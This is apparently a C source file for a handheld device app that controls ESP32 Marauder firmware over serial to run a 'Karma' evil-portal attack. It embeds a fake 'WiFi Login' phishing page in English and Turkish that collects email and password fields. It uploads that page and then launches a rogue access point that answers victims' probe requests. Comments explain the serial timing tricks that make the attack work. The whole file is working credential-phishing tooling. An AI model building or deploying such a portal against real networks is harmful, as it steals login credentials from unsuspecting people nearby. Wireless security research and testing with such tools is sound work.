#include "../marauder_gui_app_i.h"
#include <stdio.h>
#include <string.h>

enum {
    KarmaStatusEventStop,
};

/* This device has no SD card, so EvilPortal::setHtml() can never find "/index.html" - the only
   way to give it a page is uploading one over serial with "evilportal -c sethtmlstr", which
   makes the ESP32 call Serial.readString(): it keeps reading until the UART goes quiet for its
   default ~1000ms timeout, then treats whatever it collected as the whole page. So we can't
   just fire the html and the "karma -p N" command back to back - the karma command's bytes
   would get swallowed into the "html" too. This state machine waits out that silence window
   before sending anything else. */
enum {
    KarmaStateWaitBeforeHtml,
    KarmaStateWaitAfterHtml,
    KarmaStateRunning,
};

#define KARMA_WAIT_BEFORE_HTML_TICKS 3 /* ~300ms: give the ESP32 time to start reading */
#define KARMA_WAIT_AFTER_HTML_TICKS 15 /* ~1.5s: past Serial's default 1s silence timeout */

/* Minimal fake WiFi login page - EvilPortal's server posts submissions to "/get" with "email"
   and "password" fields (see EvilPortal.cpp), so the form must use those exact names. Two
   language variants of the visible page text, picked by the app's own language setting. */
static const char* marauder_karma_html_template_tr =
    "<!DOCTYPE html><html><head>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>WiFi Login</title>"
    "<style>body{font-family:sans-serif;text-align:center;padding-top:40px}"
    "input{display:block;margin:10px auto;padding:8px;width:80%}button{padding:8px 20px}</style>"
    "</head><body>"
    "<h3>WiFi Baglantisi Icin Giris Yapin</h3>"
    "<form action=\"/get\">"
    "<input name=\"email\" placeholder=\"E-posta\">"
    "<input name=\"password\" type=\"password\" placeholder=\"Sifre\">"
    "<button type=\"submit\">Baglan</button>"
    "</form></body></html>\n";

static const char* marauder_karma_html_template_en =
    "<!DOCTYPE html><html><head>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>WiFi Login</title>"
    "<style>body{font-family:sans-serif;text-align:center;padding-top:40px}"
    "input{display:block;margin:10px auto;padding:8px;width:80%}button{padding:8px 20px}</style>"
    "</head><body>"
    "<h3>Sign In to Connect to WiFi</h3>"
    "<form action=\"/get\">"
    "<input name=\"email\" placeholder=\"Email\">"
    "<input name=\"password\" type=\"password\" placeholder=\"Password\">"
    "<button type=\"submit\">Connect</button>"
    "</form></body></html>\n";

static void marauder_gui_scene_karma_status_button_callback(
    GuiButtonType result,
    InputType type,
    void* context) {
    MarauderGuiApp* app = context;
    if(type == InputTypeShort && result == GuiButtonTypeCenter) {
        view_dispatcher_send_custom_event(app->view_dispatcher, KarmaStatusEventStop);
    }
}

static void marauder_gui_scene_karma_status_redraw(MarauderGuiApp* app) {
    const char* target = "SSID";
    if(app->selected_probe_index >= 0 && (size_t)app->selected_probe_index < app->ap_count) {
        target = app->ap_list[app->selected_probe_index];
    }

    const char* status = (app->karma_state == KarmaStateRunning) ?
                             app->last_uart_line :
                             marauder_gui_text(app, "HTML gonderiliyor...", "Sending HTML...");

    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Evil Portal (Karma)");
    widget_add_text_box_element(app->widget, 0, 13, 128, 14, AlignCenter, AlignTop, target, true);
    widget_add_text_box_element(app->widget, 0, 28, 128, 20, AlignCenter, AlignTop, status, true);
    widget_add_button_element(
        app->widget,
        GuiButtonTypeCenter,
        marauder_gui_text(app, "Durdur", "Stop"),
        marauder_gui_scene_karma_status_button_callback,
        app);
}

static void marauder_gui_scene_karma_status_uart_line(MarauderGuiApp* app, const char* line) {
    strncpy(app->last_uart_line, line, MARAUDER_LINE_MAX - 1);
    app->last_uart_line[MARAUDER_LINE_MAX - 1] = '\0';
    if(app->karma_state == KarmaStateRunning) {
        marauder_gui_scene_karma_status_redraw(app);
    }
}

static void marauder_gui_scene_karma_status_tick(MarauderGuiApp* app) {
    if(app->karma_state == KarmaStateWaitBeforeHtml) {
        app->karma_wait_ticks++;
        if(app->karma_wait_ticks >= KARMA_WAIT_BEFORE_HTML_TICKS) {
            app->karma_wait_ticks = 0;
            marauder_uart_send(
                app->uart,
                marauder_gui_text(
                    app, marauder_karma_html_template_tr, marauder_karma_html_template_en));
            app->karma_state = KarmaStateWaitAfterHtml;
        }
    } else if(app->karma_state == KarmaStateWaitAfterHtml) {
        app->karma_wait_ticks++;
        if(app->karma_wait_ticks >= KARMA_WAIT_AFTER_HTML_TICKS) {
            app->karma_wait_ticks = 0;

            char cmd[32];
            snprintf(cmd, sizeof(cmd), "karma -p %d", app->selected_probe_index);
            marauder_uart_send_line(app->uart, cmd);

            app->karma_state = KarmaStateRunning;
            marauder_gui_scene_karma_status_redraw(app);
        }
    }
}

void marauder_gui_scene_karma_status_on_enter(void* context) {
    MarauderGuiApp* app = context;

    app->last_uart_line[0] = '\0';
    app->karma_state = KarmaStateWaitBeforeHtml;
    app->karma_wait_ticks = 0;

    app->uart_line_handler = marauder_gui_scene_karma_status_uart_line;
    app->tick_handler = marauder_gui_scene_karma_status_tick;

    marauder_gui_scene_karma_status_redraw(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, MarauderGuiViewWidget);

    marauder_uart_send_line(app->uart, "evilportal -c sethtmlstr");
}

bool marauder_gui_scene_karma_status_on_event(void* context, SceneManagerEvent event) {
    MarauderGuiApp* app = context;
    bool consumed = false;

    if((event.type == SceneManagerEventTypeCustom && event.event == KarmaStatusEventStop) ||
       event.type == SceneManagerEventTypeBack) {
        scene_manager_previous_scene(app->scene_manager);
        consumed = true;
    }

    return consumed;
}

void marauder_gui_scene_karma_status_on_exit(void* context) {
    MarauderGuiApp* app = context;

    marauder_uart_send_line(app->uart, "stopscan");

    app->uart_line_handler = NULL;
    app->tick_handler = NULL;
    widget_reset(app->widget);
}
